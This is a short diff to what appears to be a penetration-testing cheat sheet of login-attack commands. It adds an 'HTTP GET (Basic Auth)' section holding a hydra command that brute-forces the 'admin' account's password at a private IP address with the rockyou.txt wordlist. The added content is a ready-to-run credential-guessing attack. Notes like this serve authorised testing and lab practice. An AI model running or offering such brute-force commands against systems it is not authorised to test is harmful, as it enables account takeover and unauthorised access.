@@ -17,7 +17,10 @@ ftp://
 ```
 
 
-# HTTP GET
+# HTTP GET (Basic Auth)
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.242.201 http-head /
+```
 
 
 # HTTP POST
